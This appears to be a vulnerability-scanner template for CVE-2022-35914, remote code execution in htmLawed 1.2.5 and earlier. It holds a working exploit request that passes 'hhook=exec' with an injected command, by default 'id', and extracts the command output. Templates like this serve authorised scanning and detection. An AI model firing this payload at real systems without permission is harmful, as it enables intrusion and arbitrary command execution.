id: htmllawed-rce
info:
  author: Vulnpire
  description: This template exploits a remote code execution vulnerability in htmlLawed
    <= 1.2.5.
  name: htmlLawed 1.2.5 - Remote Code Execution (RCE)
  reference:
  - https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed
  - https://github.com/kesar/HTMLawed
  - CVE-2022-35914
  severity: high
requests:
- body: sid=foo&hhook=exec&text={{cmd}}
  cookies:
    sid: foo
  extractors:
  - part: body
    regex:
    - '&nbsp; \[[0-9]+\] => (.*)<br />'
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - part: body
    regex:
    - '&nbsp; \[[0-9]+\] =>'
    type: regex
  method: POST
  path:
  - '{{BaseURL}}'
variables:
  cmd: id
